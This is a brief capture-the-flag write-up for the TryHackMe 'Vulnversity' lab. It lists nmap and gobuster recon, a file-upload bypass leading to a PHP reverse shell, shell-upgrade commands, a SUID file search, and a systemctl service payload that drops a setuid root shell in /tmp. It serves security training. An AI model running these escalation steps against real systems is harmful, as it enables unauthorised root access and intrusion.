# Vulnversity

link to the room [`https://tryhackme.com/room/vulnversity`]

`export ip=10.10.233.95`


## Recon

### Nmap

command: `nmap -sC -sV -v -O -oN recon/nmap $ip`

### Gobuster

command: `gobuster -u http://$ip:3333 -e -w ~/Personal/tools/wordlists/dirbuster/directory-list-2.3-small.txt -o recon/gobuster`

## TASK

- found `/internal/` form for upload a file.
- use `phpext.txt` into intruder burp with grep exact.
- upload a php reverse shell.
- upgrade shell:
    - semi interactive with python spawn: `/usr/bin/python3.5 -c 'import pty; pty.spawn("/bin/bash")'`
    - `export TERM=xterm`
    - cntrl+z
    - `stty raw -echo`
    - fg & reset

- privesc using SUID files:
``` 
find / -user root -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

- found systemctl check this : `https://gtfobins.github.io/gtfobins/systemctl/`

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cp /bin/sh /tmp/rootsh && chmod +xs /tmp/rootsh"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```